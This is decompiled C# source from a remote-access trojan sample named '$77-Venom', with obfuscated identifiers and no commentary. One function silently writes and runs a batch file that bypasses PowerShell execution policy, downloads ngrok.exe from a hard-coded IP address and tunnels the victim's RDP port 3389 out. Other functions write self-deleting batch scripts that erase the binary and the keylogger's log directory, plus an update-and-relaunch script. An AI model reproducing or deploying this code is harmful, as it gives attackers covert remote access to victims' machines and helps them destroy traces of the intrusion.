// Decompiled with JetBrains decompiler
// Type: 䫆䖭縤괒渚⦻㥽ⴐ곰䥛吅ᣮꋼ綄
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using xClient.Core.Utilities;

public static class \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄
{
  private const string 㖕\uFFFDᅟ츝롢틋ᔛ楴שּׂ舁清踺\u02DE펐鬎欴煰\uFFFD侏奪 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random 擃\uA833ჴ诣쀀䟮댾믅璼휏〵孓\uA4AA庠沲扽Ó꼗嚜爸 = new Random(Environment.TickCount);

  public static string 걙봿㧤퍻䳌鎮䝅\u2EA2ᄴ\uE21D朡\uF897鯞涮\u219Bᤗ嚳쿰魝㫲(int length, string extension = "")
  {
    StringBuilder stringBuilder = new StringBuilder(length);
    for (int index = 0; index < length; ++index)
      stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[\uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.擃\uA833ჴ诣쀀䟮댾믅璼휏〵孓\uA4AA庠沲扽Ó꼗嚜爸.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
    return stringBuilder.ToString() + extension;
  }

  public static string \uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(string extension)
  {
    string path;
    do
    {
      path = Path.Combine(Path.GetTempPath(), \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.걙봿㧤퍻䳌鎮䝅\u2EA2ᄴ\uE21D朡\uF897鯞涮\u219Bᤗ嚳쿰魝㫲(12, extension));
    }
    while (File.Exists(path));
    return path;
  }

  public static bool 鷣抈ឈ䑔\uFFFD讣찚㗀\u21BD켨뉡뿞㾢纃礳\uFFFD\uE016튢\u2417\uEB00(byte[] block)
  {
    if (block.Length < 2)
      return false;
    if (block[0] == (byte) 77 && block[1] == (byte) 90)
      return true;
    return block[0] == (byte) 90 && block[1] == (byte) 77;
  }

  public static bool 䏀녂\uF572馘熹\uE9C3瑊à妪ゲ㯝峰欓뒪\uE279ꆿ띙\uE576\uF857\uECFD(string filePath) => \u2524ꍔ㻌䭣ǖ岓\uEE62꼩岠\uFFFD\u2E04꺅\u0F31ᮮ￺\u31BC袼쒲㒞誠.謼뾗\u3308\u204F쓛\u26D2\u2B18\uE191穞皝놞\uE6EF祕ᤃ迫ᱲ잋⁢啍빧(filePath + ":Zone.Identifier");

  public static string ɰ慍\uE810Ḅ彀\uEA07捃雽両逭᠔쒛쥮ᓷ\uFFFD鯟\uF389疣발쩟(bool isFileHidden)
  {
    try
    {
      string path = \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\"\r\nrmdir /q /s \"" + Keylogger.LogDirectory + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 倝\uE2E7涏頣\u2883쨍竾\u2F28廐\u20C1鹶뗚躟ꕑ釱\uFFFDꜭᰐ耐œ(string token)
  {
    try
    {
      string path = Path.Combine(Path.GetTempPath(), "ngrok.bat");
      string contents = "set downloadURL=http://91.134.207.16/ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\nset exeFile=%TEMP%\\ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\npowershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');\r\n%exeFile% authtoken " + token + " \r\n%exeFile%  tcp  3389 > %logFile% \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -noexit -executionpolicy bypass -File " + path + " ",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 痾㙅扬抽梶쨡曠ꑬ嵍\u2537횠\u104C\uF023o\uF88Dꧦꊙ\u2346淇鑾(
    string newFilePath,
    bool isFileHidden)
  {
    try
    {
      string path = \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\"\r\nstart \"\" \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 嬘熨ൌ潨뀎邦詧\u171Cܹꇲ䵋웱斷ぬ⃩於姶㴓\uD92D\uDDA4()
  {
    try
    {
      string path = \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static void 䨮\uABFA렟훠Қ\uF59Cግ潤폯섶눖岠닓츔跉\uECD6労ﾊਤ落(string filename, string appendText)
  {
    appendText = \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\u0C3B皒ﷁ\u22C3\uE8C3녧쯼精\u20BE䝲䨇光\u285A굤냟鳽\u282D笲꾝掠(filename) + appendText;
    using (FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write))
    {
      byte[] buffer = 槦\uFFFD辺櫌\uEA69ɱ\uE127\uE010銃㡔臚\uAACE蒂ἄ鞷퀆\u2A62鲮䛱黖.\uF34A痚\uFFFD\uF033樔䖍뤲秖恑\uFFFD正绫裘\uEC68\uE055\uF412탣뛚銸宅(Encoding.UTF8.GetBytes(appendText));
      fileStream.Seek(0L, SeekOrigin.Begin);
      fileStream.Write(buffer, 0, buffer.Length);
    }
  }

  public static string \u0C3B皒ﷁ\u22C3\uE8C3녧쯼精\u20BE䝲䨇光\u285A굤냟鳽\u282D笲꾝掠(string filename) => !File.Exists(filename) ? string.Empty : Encoding.UTF8.GetString(槦\uFFFD辺櫌\uEA69ɱ\uE127\uE010銃㡔臚\uAACE蒂ἄ鞷퀆\u2A62鲮䛱黖.\uFFFD빚ꍮレ叼侽钲狷徸\u32E8ᕈꣽ絨蜞\u32DF從䩃댛枘顏(File.ReadAllBytes(filename)));
}
